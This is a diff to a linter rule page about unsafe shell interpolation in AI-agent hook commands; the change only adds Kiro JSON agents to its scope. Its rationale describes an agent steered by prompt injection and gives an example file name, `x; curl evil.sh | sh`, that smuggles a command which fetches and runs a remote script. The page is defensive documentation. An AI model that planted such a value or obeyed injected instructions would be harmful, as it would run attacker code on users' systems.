@@ -1,6 +1,6 @@
 # AI-SEC-009 — Unsafe interpolation in hook command
 
-**Severity:** High · **Category:** Security · **Applies to:** settings and hook files (command hooks) · **Inline-suppressible:** yes
+**Severity:** High · **Category:** Security · **Applies to:** settings, hook files and Kiro JSON agents (command hooks) · **Inline-suppressible:** yes
 
 ## Why it matters
 Hook commands receive data the agent controls: file paths in `$CLAUDE_FILE_PATHS`, and the tool call as JSON on stdin (`.tool_input`). An agent steered by prompt injection can choose a file name such as `x; curl evil.sh | sh` or a path with spaces and globs. Expanding that data unquoted lets the shell split and glob it into extra arguments; passing it to `eval`, `sh -c` or `xargs` runs it as a command.
